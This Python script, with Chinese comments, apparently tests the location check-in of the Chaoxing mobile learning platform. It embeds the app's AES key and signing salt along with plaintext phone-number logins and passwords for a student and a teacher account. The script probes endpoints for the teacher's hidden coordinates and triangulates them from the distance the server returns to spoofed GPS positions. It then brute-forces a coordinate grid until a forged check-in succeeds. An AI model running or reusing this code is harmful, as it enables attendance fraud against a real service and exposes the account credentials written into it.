#!/usr/bin/env python3
"""
位置签到深入测试:
1. 获取教师指定的签到位置坐标（信息泄露）
2. 用精确位置伪造签到
3. 探索活动详情API获取位置信息
"""
import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

location_aid = "5000139505593"

# ======================================================================
# 1. 获取活动详情 - 寻找教师指定位置信息泄露
# ======================================================================
print("=" * 80)
print("[1] 获取活动详情 - 寻找教师指定位置")
print("=" * 80)

# 尝试各种API获取活动详情（包含教师设定的位置）
detail_endpoints = [
    # 学生端尝试
    (f"{BASE}/ppt/activeAPI/taskdetail", {"activeId": location_aid, "courseId": COURSE_ID, "classId": CLASS_ID}, "taskdetail-学生"),
    (f"{BASE}/pptSign/signDetail", {"activeId": location_aid, "uid": puid_s}, "signDetail-学生"),
    (f"{BASE}/pptSign/getSignDetail", {"activeId": location_aid, "uid": puid_s}, "getSignDetail-学生"),
    (f"{BASE}/pptSign/signInfo", {"activeId": location_aid}, "signInfo-学生"),
    (f"{BASE}/pptSign/getSignInfo", {"activeId": location_aid}, "getSignInfo-学生"),
    (f"{BASE}/pptSign/activeDetail", {"activeId": location_aid}, "activeDetail-学生"),
    (f"{BASE}/pptSign/taskDetail", {"activeId": location_aid}, "taskDetail-学生"),
    (f"{BASE}/ppt/activeAPI/getActiveDetail", {"activeId": location_aid, "courseId": COURSE_ID}, "getActiveDetail-学生"),
    (f"{BASE}/v2/apis/active/detail", {"activeId": location_aid, "uid": puid_s}, "v2-active-detail-学生"),
    # 教师端对比
    (f"{BASE}/ppt/activeAPI/taskdetail", {"activeId": location_aid, "courseId": COURSE_ID, "classId": CLASS_ID}, "taskdetail-教师"),
    (f"{BASE}/pptSign/signDetail", {"activeId": location_aid, "uid": puid_t}, "signDetail-教师"),
    (f"{BASE}/pptSign/signedResult", {"activeId": location_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t}, "signedResult-教师"),
]

for url, params, tag in detail_endpoints:
    session = s_t if "教师" in tag else s_s
    r = session.get(url, params=params, timeout=15)
    d = safe_json(r)
    resp_preview = json.dumps(d, ensure_ascii=False)[:300]

    # 检查是否包含位置信息
    has_location = any(kw in resp_preview.lower() for kw in ["latitude", "longitude", "lat", "lng", "location", "地址", "distance"])
    marker = "<<<<" if has_location else "   "
    print(f"  {marker} {tag}: HTTP {r.status_code}, len={len(r.text)}")

    if has_location:
        print(f"      包含位置信息: {resp_preview[:400]}")
    elif r.status_code == 200 and len(r.text) > 50 and not r.text.startswith("<!DOCTYPE"):
        print(f"      {resp_preview[:200]}")

# ======================================================================
# 2. 二分法定位 - 通过距离反推教师设定位置
# ======================================================================
print("\n" + "=" * 80)
print("[2] 二分法定位 - 通过距离反推教师设定位置")
print("=" * 80)

# 先设为缺勤
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"  设为缺勤: {r.text[:50]}")
time.sleep(2)

# 已知：北京(39.908823,116.397470) 距离618487米
# 中国主要城市坐标范围大约在：
# 纬度: 18~54度
# 经度: 73~135度

# 从已知距离估算大致方位
# 北京到上海约1068km，但返回的距离是618km
# 说明目标位置在北京和上海之间偏南的位置

# 让我们测试几个关键城市来缩小范围
test_cities = [
    ("武汉", "30.584355", "114.298572"),
    ("南京", "32.058360", "118.796468"),
    ("合肥", "31.861191", "117.29081"),
    ("杭州", "30.274084", "120.155070"),
    ("南昌", "28.682022", "115.857940"),
    ("长沙", "28.228209", "112.938814"),
    ("郑州", "34.75661", "113.65004"),
    ("济南", "36.651216", "116.997190"),
    ("石家庄", "38.042811", "114.508771"),
    ("太原", "37.873516", "112.550864"),
    ("西安", "34.265837", "108.954100"),
    ("成都", "30.671970", "104.064760"),
    ("重庆", "29.563008", "106.551556"),
    ("广州", "23.129110", "113.264380"),
]

distances = []
for name, lat, lng in test_cities:
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                       "latitude": lat, "longitude": lng, "appType": "15", "fid": "0"},
                 headers=ajax_hdr, timeout=10)
    text = r.text
    dist_match = None
    if "米" in text:
        import re
        m = re.search(r'(\d+\.?\d*)\s*米', text)
        if m:
            dist_match = float(m.group(1))
            distances.append((name, lat, lng, dist_match))
    status_icon = "OK" if "不在可签到范围" in text or "已签到" in text else "??"
    print(f"  {name}({lat},{lng}): {text[:80]} [{status_icon}] 距离={dist_match}")
    time.sleep(0.3)

# 找距离最短的城市
if distances:
    distances.sort(key=lambda x: x[3])
    closest = distances[0]
    print(f"\n  最接近的城市: {closest[0]}, 距离={closest[3]:.0f}m, 坐标=({closest[1]},{closest[2]})")

# ======================================================================
# 3. 精确二分法定位
# ======================================================================
print("\n" + "=" * 80)
print("[3] 精确二分法定位")
print("=" * 80)

# 基于之前的结果，用最接近的城市为中心进行精细搜索
if distances:
    base_lat = float(closest[1])
    base_lng = float(closest[2])

    # 在±1度范围内搜索（约111km）
    best_dist = float('inf')
    best_coords = (base_lat, base_lng)

    step = 0.02  # 约2.2km步长
    for dlat in [-step, 0, step]:
        for dlng in [-step, 0, step]:
            test_lat = base_lat + dlat
            test_lng = base_lng + dlng
            r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                         data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                               "latitude": str(test_lat), "longitude": str(test_lng),
                               "appType": "15", "fid": "0"},
                         headers=ajax_hdr, timeout=10)
            text = r.text
            import re as _re
            m = _re.search(r'(\d+\.?\d*)\s*米', text)
            if m:
                dist = float(m.group(1))
                if dist < best_dist:
                    best_dist = dist
                    best_coords = (test_lat, test_lng)
                if dist < 5000:  # 5km以内
                    print(f"  *** 发现近距离点: ({test_lat:.6f},{test_lng:.6f}), 距离={dist:.0f}m ***")

    print(f"\n  最佳坐标: ({best_coords[0]:.6f},{best_coords[1]:.6f}), 距离={best_dist:.0f}m")

    # 如果找到足够近的点，尝试精确匹配
    if best_dist < 2000:  # 2km以内
        print("\n  --- 尝试精确匹配 ---")
        # 在最佳点周围进行更细的搜索
        fine_step = 0.001  # 约111m
        for i in range(-10, 11):
            for j in range(-10, 11):
                test_lat = best_coords[0] + i * fine_step
                test_lng = best_coords[1] + j * fine_step
                r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                             data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                                   "latitude": str(test_lat), "longitude": str(test_lng),
                                   "appType": "15", "fid": "0"},
                             headers=ajax_hdr, timeout=10)
                if "成功" in r.text or "已签到" in r.text or "success" in r.text.lower() and "error" not in r.text.lower()[:20]:
                    print(f"  *** 签到成功！坐标=({test_lat:.6f},{test_lng:.6f}) ***")
                    break
            else:
                continue
            break

# ======================================================================
# 4. 恢复状态
# ======================================================================
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"\n恢复: {r.text[:50]}")

print("\n测试完成")
